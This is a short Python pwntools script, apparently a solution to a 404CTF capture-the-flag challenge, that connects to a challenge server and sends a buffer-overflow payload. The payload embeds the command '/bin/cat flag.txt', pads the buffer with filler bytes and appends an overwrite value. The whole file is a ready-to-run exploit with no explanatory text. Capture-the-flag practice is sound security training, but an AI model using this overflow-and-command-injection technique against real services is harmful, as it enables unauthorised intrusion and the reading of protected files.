from pwn import remote, log
from time import sleep

RHOST = "challenges.404ctf.fr"
RPORT = 31958

shellcode = b'/bin/cat flag.txt\x00'
n = 106 - len(shellcode)
payload = shellcode + b'A' * n + b'gagne\x00\x0a'

log.info(f"Payload: {payload}")
conn = remote(RHOST, RPORT)

print(conn.recvline().decode())
print(conn.recvline().decode())
sleep(.2)
conn.send(payload)
print(conn.recvall())
sleep(.2)
conn.close()
